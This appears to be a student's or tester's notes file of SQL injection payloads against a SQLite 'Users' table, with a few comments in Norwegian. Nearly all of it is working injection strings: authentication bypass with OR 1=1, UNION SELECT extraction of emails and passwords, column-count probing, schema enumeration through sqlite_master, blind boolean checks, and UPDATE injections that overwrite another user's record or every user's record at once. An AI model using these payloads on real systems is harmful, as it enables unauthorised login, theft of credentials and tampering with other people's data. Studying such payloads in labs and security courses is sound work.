# Edit all users
INPUT_education', username='INPUT', first_name='INPUT', last_name='INPUT', password='INPUT', education='INPUT', employment='INPUT', music='INPUT', movie='INPUT', nationality='INPUT',birthday='INPUT_YYYY-MM-DD' WHERE username='' OR 1=1;/*

Possible SQL injection commands for SELECT
SELECT * FROM Users WHERE username = '[input]';
If you need to escape the last ' you can use -- to comment it out

Authentication bypass
SELECT * FROM Users WHERE username = '' OR 1=1 --';
Returns all users, potentially logging in as the first one. 

Extract Data with UNION SELECT
SELECT * FROM Users WHERE username = '' UNION SELECT 1, email, password FROM Users --';

Discover Column Count (using ORDER BY)
SELECT * FROM Users WHERE username = '' ORDER BY n --';
Try increasing n (e.g., ORDER BY 1, ORDER BY 2, ...) until you get an error.
The highest successful number is the number of columns in the result set.

Error-Based Injection (SQLite-Specific)
SELECT * FROM Users WHERE username = '' || (SELECT sqlite_version()) --';

Blind Injection (Boolean-based)
SELECT * FROM Users WHERE username = '' AND (SELECT COUNT(*) FROM Users WHERE username='admin') > 0 --';

Schema Enumeration - Tables
SELECT * FROM Users WHERE username = '' UNION SELECT 1, name, null FROM sqlite_master WHERE type='table' --';
This will list all table names in the database

Schema Enumeration - Tables
SELECT * FROM Users WHERE username = '' UNION SELECT 1, sql, null FROM sqlite_master WHERE tbl_name='Users' AND type='table' --';
This will list all column names in the specific table

Check for Specific Data
SELECT * FROM Users WHERE username = '' AND EXISTS(SELECT 1 FROM Users WHERE password='hunter2') --';


Possible SQL injection commands for INSERT
INSERT INTO users (username, first_name, last_name, password) VALUES ('[input]', '[input]', '[input]', '[input]'

Data injection
You can decide to store whatever you want into the inputs which later can be extracted
from somewhere. 

Possible SQL injection commands for UPDATE
UPDATE Users SET education='[input]', employment='[input]', music='[input]', movie='[input]', nationality='[input]', birthday='[input]'WHERE username='[input]';

endret Jane', birthday='1990-01-01' WHERE username='Jane';--', birthday='[input]'WHERE username='[input]';


Data injection
You can decide to store whatever you want into the inputs which later can be extracted
from somewhere. Also you can edit another persons information. 

Also note that you can comment out everything after education and therefore edit information on all users at the same time

----------------

# Denne linjen lager 
INPUT_education', employment= employment || employment WHERE username='test';/*

INPUT_education', username= 'test', first_name= first_name || first_name, last_name= last_name || last_name, password= password || password, education= education || education, employment= employment || employment, music= music || music, movie= movie || movie, nationality= nationality || nationality, birthday= birthday WHERE username='' OR 1=1;/*